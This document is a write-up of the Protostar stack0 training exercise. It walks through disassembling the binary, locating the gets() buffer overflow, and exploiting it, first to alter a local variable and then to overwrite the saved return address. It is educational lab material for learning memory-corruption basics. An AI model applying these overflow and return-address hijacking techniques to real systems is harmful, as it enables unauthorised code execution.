---
title: "stack0"
date: "2023-05-16"
site: https://exploit.education/protostar/
---

`/opt/protostar/bin/stack0`

```c
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>

int main(int argc, char **argv)
{
  volatile int modified;
  char buffer[64];

  modified = 0;
  gets(buffer);

  if(modified != 0) {
      printf("you have changed the 'modified' variable\n");
  } else {
      printf("Try again?\n");
  }
}
```

## Disassembly

Can dump the assembly code in the following ways.

### objdump

```bash
objdump -M intel -d stack0
```

This will give a very detailed overview of the various sections for a binary.

It can be simplified by filtering for the specific functions we want instead:

```bash
objdump -d stack0 | sed '/<main>:/,/^$/!d'
```

```bash
user@protostar:/opt/protostar/bin$ objdump -d stack0 | sed '/<main>:/,/^$/!d'
080483f4 <main>:
 80483f4:       55                      push   ebp
 80483f5:       89 e5                   mov    ebp,esp
 80483f7:       83 e4 f0                and    esp,0xfffffff0
 80483fa:       83 ec 60                sub    esp,0x60
 80483fd:       c7 44 24 5c 00 00 00    mov    DWORD PTR [esp+0x5c],0x0
 8048404:       00
 8048405:       8d 44 24 1c             lea    eax,[esp+0x1c]
 8048409:       89 04 24                mov    DWORD PTR [esp],eax
 804840c:       e8 fb fe ff ff          call   804830c <gets@plt>
 8048411:       8b 44 24 5c             mov    eax,DWORD PTR [esp+0x5c]
 8048415:       85 c0                   test   eax,eax
 8048417:       74 0e                   je     8048427 <main+0x33>
 8048419:       c7 04 24 00 85 04 08    mov    DWORD PTR [esp],0x8048500
 8048420:       e8 07 ff ff ff          call   804832c <puts@plt>
 8048425:       eb 0c                   jmp    8048433 <main+0x3f>
 8048427:       c7 04 24 29 85 04 08    mov    DWORD PTR [esp],0x8048529
 804842e:       e8 f9 fe ff ff          call   804832c <puts@plt>
 8048433:       c9                      leave
 8048434:       c3                      ret
 8048435:       90                      nop
 8048436:       90                      nop
 8048437:       90                      nop
 8048438:       90                      nop
 8048439:       90                      nop
 804843a:       90                      nop
 804843b:       90                      nop
 804843c:       90                      nop
 804843d:       90                      nop
 804843e:       90                      nop
 804843f:       90                      nop
```

### gdb

We can view the disassembly code within gdb, or dump it out to the terminal:

```bash
gdb -batch -ex 'file stack0' -ex 'disassemble main'
```

```bash
user@protostar:/opt/protostar/bin$ gdb -batch -ex 'file stack0' -ex 'disassemble main'
Dump of assembler code for function main:
0x080483f4 <main+0>:    push   %ebp
0x080483f5 <main+1>:    mov    %esp,%ebp
0x080483f7 <main+3>:    and    $0xfffffff0,%esp
0x080483fa <main+6>:    sub    $0x60,%esp
0x080483fd <main+9>:    movl   $0x0,0x5c(%esp)
0x08048405 <main+17>:   lea    0x1c(%esp),%eax
0x08048409 <main+21>:   mov    %eax,(%esp)
0x0804840c <main+24>:   call   0x804830c <gets@plt>
0x08048411 <main+29>:   mov    0x5c(%esp),%eax
0x08048415 <main+33>:   test   %eax,%eax
0x08048417 <main+35>:   je     0x8048427 <main+51>
0x08048419 <main+37>:   movl   $0x8048500,(%esp)
0x08048420 <main+44>:   call   0x804832c <puts@plt>
0x08048425 <main+49>:   jmp    0x8048433 <main+63>
0x08048427 <main+51>:   movl   $0x8048529,(%esp)
0x0804842e <main+58>:   call   0x804832c <puts@plt>
0x08048433 <main+63>:   leave
0x08048434 <main+64>:   ret
End of assembler dump.
```

This produces a much cleaner output, without the trailing `nop`s.

## Identifying the vulnerability

```c
volatile int modified;
```

`volatile` ensures that the compiler does not optimise trivial or unused variables away.

```c
gets(buffer);
```

`gets` is an unsafe copying method which can overflow the buffer supplied.

```c
volatile int modified;
char buffer[64];
```

Since `modified` comes above `buffer`, it is the first thing to be written when `buffer` is overflown.

This is because the stack is allocated from higher addresses to lower addresses.

## Analysis

Set a breakpoint before the `if` statement:

```
(gdb) b *0x08048411
Breakpoint 1 at 0x8048411: file stack0/stack0.c, line 13.
```

We can try to pass in 24 `A`s to examine what the stack looks like.

```
(gdb) r
Starting program: /opt/protostar/bin/stack0
AAAAAAAAAAAAAAAAAAAAAAAA

Breakpoint 1, main (argc=1, argv=0xbffff854) at stack0/stack0.c:13
13      in stack0/stack0.c

(gdb) x/24wx $esp
0xbffff740:     0xbffff75c      0x00000001      0xb7fff8f8      0xb7f0186e
0xbffff750:     0xb7fd7ff4      0xb7ec6165      0xbffff768      0x41414141
0xbffff760:     0x41414141      0x41414141      0x41414141      0x41414141
0xbffff770:     0x41414141      0x08049600      0xbffff7a8      0x08048469
0xbffff780:     0xb7fd8304      0xb7fd7ff4      0x08048450      0xbffff7a8
0xbffff790:     0xb7ec6365      0xb7ff1040      0x0804845b      0x00000000
```

In this case, we can see that the buffer starts from `0xbffff750` + `c`

`modified` variable is at `0xbffff790` + `c`

As such, we need to fill up `buffer` completely with 64 `A`s and another to write into `modified`.

Since `modified` is an `int`, all 4 bytes at `0xbffff79c` are read for its value.

We can try again with 65 `A`s:

```
(gdb) r
Starting program: /opt/protostar/bin/stack0
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA

Breakpoint 1, main (argc=1, argv=0xbffff854) at stack0/stack0.c:13
13      stack0/stack0.c: No such file or directory.
        in stack0/stack0.c
(gdb) x/24wx $esp
0xbffff740:     0xbffff75c      0x00000001      0xb7fff8f8      0xb7f0186e
0xbffff750:     0xb7fd7ff4      0xb7ec6165      0xbffff768      0x41414141
0xbffff760:     0x41414141      0x41414141      0x41414141      0x41414141
0xbffff770:     0x41414141      0x41414141      0x41414141      0x41414141
0xbffff780:     0x41414141      0x41414141      0x41414141      0x41414141
0xbffff790:     0x41414141      0x41414141      0x41414141      0x00000041
(gdb) c
Continuing.
you have changed the 'modified' variable

Program exited with code 051.
```

## Exploit

```bash
user@protostar:/opt/protostar/bin$ ./stack0
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
you have changed the 'modified' variable
```

```bash
user@protostar:/opt/protostar/bin$ echo $(python -c 'print "A"*65') | ./stack0
you have changed the 'modified' variable
```

## Exploration

It is possible to overwrite the `eip` as well to return to the target statement.

This is pointless since we will fulfil the objective of changing the `modified` variable in the process of overwriting `eip`.

We can change the objective to return to `0x08048427` instead to make it print the failure message as well.

```
(gdb) b *0x08048411
Breakpoint 1 at 0x8048411: file stack0/stack0.c, line 13.
(gdb) r
Starting program: /opt/protostar/bin/stack0
AAAAAAAA

Breakpoint 1, main (argc=1, argv=0xbffff854) at stack0/stack0.c:13
13      stack0/stack0.c: No such file or directory.
        in stack0/stack0.c
(gdb) info frame
Stack level 0, frame at 0xbffff7b0:
 eip = 0x8048411 in main (stack0/stack0.c:13); saved eip 0xb7eadc76
 source language c.
 Arglist at 0xbffff7a8, args: argc=1, argv=0xbffff854
 Locals at 0xbffff7a8, Previous frame's sp is 0xbffff7b0
 Saved registers:
  ebp at 0xbffff7a8, eip at 0xbffff7ac
```

```
(gdb) r
Starting program: /opt/protostar/bin/stack0
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBCCCCDDDDEEEEFFFF

Breakpoint 1, main (argc=70, argv=0xbffff854) at stack0/stack0.c:13
13      in stack0/stack0.c
(gdb) info frame
Stack level 0, frame at 0xbffff7b0:
 eip = 0x8048411 in main (stack0/stack0.c:13); saved eip 0x46464645
 source language c.
 Arglist at 0xbffff7a8, args: argc=70, argv=0xbffff854
 Locals at 0xbffff7a8, Previous frame's sp is 0xbffff7b0
 Saved registers:
  ebp at 0xbffff7a8, eip at 0xbffff7ac
(gdb) c
Continuing.
you have changed the 'modified' variable

Program received signal SIGSEGV, Segmentation fault.
0x46464645 in ?? ()
```

Since we overwrite the modified variable, 

We know that there are 80 characters needed to reach the `eip`.

### Exploit

```bash
user@protostar:/opt/protostar/bin$ echo $(python -c 'print "A"*80 + "\x27\x84\x04\x08"') | ./stack0
you have changed the 'modified' variable
Try again?
Segmentation fault
```
